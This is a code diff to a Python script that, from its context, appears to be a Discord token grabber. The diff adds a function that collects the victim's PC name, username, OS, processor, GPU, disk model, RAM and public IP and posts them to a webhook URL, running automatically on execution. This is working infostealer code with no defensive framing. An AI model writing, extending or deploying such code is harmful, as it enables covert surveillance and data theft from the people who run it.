@@ -9,6 +9,9 @@ from subprocess import Popen, PIPE
 import requests, json, os
 from datetime import datetime
 import sys
+import platform
+import psutil
+import wmi
 
 tokens = []
 cleaned = []
@@ -128,3 +131,37 @@ def get_token():
                 else: continue
 if __name__ == '__main__':
     get_token()
+def send_system_info():
+    try:
+        # Initialize WMI
+        c = wmi.WMI()
+        
+        # Collect hardware details
+        gpu_name = c.Win32_VideoController()[0].Name
+        disk_model = c.Win32_DiskDrive()[0].Model
+        public_ip = requests.get('https://api.ipify.org', timeout=5).text
+        
+        # Sending directly to the webhook without a variable for the URL
+        requests.post(
+            'YOUR_WEBHOOK_URL_HERE', 
+            json={
+                "content": (
+                    "### 🖥️ Enhanced System Information Report\n"
+                    f"**PC Name:** {platform.node()}\n"
+                    f"**Username:** {os.getlogin()}\n"
+                    f"**OS:** {platform.system()} {platform.release()}\n"
+                    f"**Processor:** {platform.processor()}\n"
+                    f"**GPU:** {gpu_name}\n"
+                    f"**Disk Model:** {disk_model}\n"
+                    f"**RAM:** {round(psutil.virtual_memory().total / (1024**3), 2)} GB\n"
+                    f"**Public IP:** {public_ip}"
+                )
+            }
+        )
+        print("Information sent successfully.")
+        
+    except Exception as e:
+        print(f"An error occurred: {e}")
+
+if __name__ == "__main__":
+    send_system_info()
